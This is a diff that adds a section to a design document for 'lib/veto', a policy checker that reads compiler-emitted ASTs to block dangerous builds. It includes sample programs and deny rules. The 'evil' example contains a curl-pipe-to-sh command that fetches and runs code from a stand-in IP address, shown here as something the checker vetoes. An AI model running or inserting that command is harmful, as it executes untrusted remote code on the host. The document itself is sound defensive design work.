@@ -153,6 +153,119 @@ The key design question you raised: inspect the **generated `.c`** or the
   aeb-only route that needs *no* aether change at all — a parallel path to the
   same "read the build's intent" goal, usable today.
 
+#### What the emitted AST actually looks like
+
+These are **real `aetherc --emit=ast` outputs** (v0.226.0+), pretty-printed
+from the one-line JSON the compiler emits to stdout. This is exactly what
+`lib/veto`'s `decide()` walks.
+
+**An evil tree** — declares `extern syscall` and shells out:
+
+```aether
+// evil.ae
+import std.os
+extern syscall(n: int) -> int
+main() {
+    os.system("curl http://1.2.3.4 | sh")
+    syscall(1)
+}
+```
+
+```console
+$ aetherc --emit=ast evil.ae        # exit 0
+```
+```json
+{"nodes": [
+  {"kind": "import_statement", "file": "evil.ae", "line": 1, "module": "std.os"},
+  {"kind": "extern_function",  "file": "evil.ae", "line": 2, "name": "syscall"},
+  {"kind": "function_call",    "file": "evil.ae", "line": 4, "callee": "os_system"},
+  {"kind": "function_call",    "file": "evil.ae", "line": 5, "callee": "syscall"}
+]}
+```
+
+How `lib/veto` reads it under the default policy (deny `extern` + deny
+`exec`): the `extern_function` `syscall` node **vetoes immediately**
+(`denied extern: syscall (evil.ae) (veto:extern)`) — and the
+`function_call` `os_system` would too (deny `exec`). Note `os.system(...)`
+surfaced as the **resolved callee `os_system`**, not the source spelling —
+that's the property that makes alias/concat obfuscation useless against 2b.
+
+**A clean tree** — only stdlib, no dangerous extern:
+
+```aether
+// clean.ae
+import std.string
+extern println(s: string)
+main() {
+    x = string.concat("hello ", "world")
+    println(x)
+}
+```
+
+```console
+$ aetherc --emit=ast clean.ae       # exit 0
+```
+```json
+{"nodes": [
+  {"kind": "import_statement", "file": "clean.ae", "line": 1, "module": "std.string"},
+  {"kind": "extern_function",  "file": "clean.ae", "line": 2, "name": "println"},
+  {"kind": "function_call",    "file": "clean.ae", "line": 4, "callee": "string_concat"},
+  {"kind": "function_call",    "file": "clean.ae", "line": 5, "callee": "println"}
+]}
+```
+
+This **clears**: `string_concat` isn't in the `exec`/`net` families, and the
+`extern println` is on `lib/veto`'s known-safe runtime-extern allowlist
+(`println`/`print`/`exit`/`panic`/`assert`). *A blanket "deny all extern"
+would false-positive here — the live smoke caught exactly this, which is why
+the allowlist exists. A specific `extern\tprintln` rule still overrides it.*
+
+**A selective import** — `import X (a, b)` surfaces `selected[]`, and the
+bare call still resolves to its canonical binding:
+
+```aether
+// sel.ae
+import std.string (concat)
+extern println(s: string)
+main() { println(concat("a", "b")) }
+```
+
+```json
+{"nodes": [
+  {"kind": "import_statement", "file": "sel.ae", "line": 1,
+   "module": "std.string", "selected": ["concat"]},
+  {"kind": "extern_function",  "file": "sel.ae", "line": 2, "name": "println"},
+  {"kind": "function_call",    "file": "sel.ae", "line": 3, "callee": "println"},
+  {"kind": "function_call",    "file": "sel.ae", "line": 3, "callee": "string_concat"}
+]}
+```
+
+Even though the source wrote bare `concat(...)`, the call node carries
+`callee: "string_concat"` — the resolved binding. A `deny import std.string`
+rule would match the `import_statement` node; an `allow_import` allowlist uses
+the same `module` field (and `selected[]` to distinguish whole-module from
+single-name imports).
+
+**Other node fields** (from the v0.227.0 schema, not shown above):
+`extern_function` carries `"variadic": true` on varargs externs; an
+`import_statement` carries `"alias"` for `import X as Y` and `"glob": true`
+for `import X (*)`; a `function_call` with **no static target**
+(function-pointer dispatch) emits `"indirect": true` instead of `callee` —
+**`lib/veto` fail-closes on those** (no readable target ⇒ veto). A node whose
+`file` is **NULL** is compiler-synthesised; a deny-match on one is surfaced as
+`<unknown-origin>` rather than silently trusted or vetoed.
+
+**Fail-closed exit:** a tree that doesn't typecheck emits **no AST** and
+`aetherc --emit=ast` exits non-zero — `lib/veto` treats that as a veto
+(`veto:no-ast`), never falling through to a build.
+
+```console
+$ aetherc --emit=ast broken.ae      # has a type error
+error[E0301]: Undefined function ...
+$ echo $?
+1                                   # → lib/veto: VETO (veto:no-ast)
+```
+
 ### Layer 3 — runtime containment (the part the source set can't override)
 
 Covered in depth in "Veto is policy; containment is enforcement" below. The
